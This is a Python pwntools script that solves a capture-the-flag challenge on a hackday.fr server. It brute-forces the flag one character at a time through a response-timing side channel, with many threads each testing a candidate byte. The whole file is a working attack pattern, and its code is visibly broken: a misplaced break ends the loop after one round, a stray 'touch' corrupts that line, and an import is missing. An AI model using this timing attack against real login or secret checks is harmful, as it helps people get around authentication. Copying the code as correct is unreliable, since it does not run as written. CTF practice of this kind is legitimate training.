from pwn import *
import time
import threading

# Enable debug logging for pwnlib
context.log_level = 'debug'

# Remote connection setup
remote_host = 'challenges.hackday.fr'
remote_port = 48118

# Characters to test
choices = bytearray(b"abcdefghijklmnopqrstuvwxyz" +  # Lowercase
                   b"ABCDEFGHIJKLMNOPQRSTUVWXYZ" +  # Uppercase
                   b"_" +                          # Underscore
                   string.punctuation.encode())  

# Lock to prevent race conditions
lock = threading.Lock()
results = []  # Shared list to store results from threads


def test_flag(FLAG: bytearray, b: bytes):
    """
    Thread function to test a specific byte in the FLAG.
    Creates its own connection to avoid conflicts.
    """
    try:
        # Create a new connection for this thread
        conn = remote(remote_host, remote_port)

        # Measure response time
        start_time = time.time()
        payload = FLAG + bytes([b]) + (b"A" * (21 - (len(FLAG) + 1)))
        print("PAYLOAD", payload)
        conn.sendline(payload)
        response = conn.recvline(timeout=1)  # Receive the response (with a timeout)
        end_time = time.time()

        # Calculate response time (delta)
        delta = end_time - start_time

        # Append the result (byte and delta) to the shared list
        with lock:
            results.append((b, delta))

        conn.close()  # Close the connection
    except Exception as e:
        print(f"Error in thread for byte {b}: {e}")


def main():
    FLAG = bytearray(b"HACKDAY{")  # Starting part of the FLAG

    while len(FLAG) < 21:
        # Clear results for the current round
        global results
        results = []

        threads = []
        for b in choices:
            # Start a thread for each byte
            thread = threading.Thread(target=test_flag, args=(FLAG.copy(), b))
            threads.append(thread)
            thread.start()

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

        # Sort results by delta (response time) in descending order
        sorted_results = sorted(results, key=lambda x: x[1], reverse=True)

        # Debug: Print the sorted results
        print("Sorted Results:", sorted_results)

        # Add the byte with the highest delta to the FLAG
        if sorted_results:
            best_byte = sorted_results[0][0]
            FLAG.append(best_byte)
            print(f"Updated FLAG: {FLAG}")

        else:
            print("No results returned. Exiting.")
        break  # Exit if no results are returned (likely an error)touch 

    print("\nFinal FLAG:", FLAG.decode())


if __name__ == "__main__":
    main()
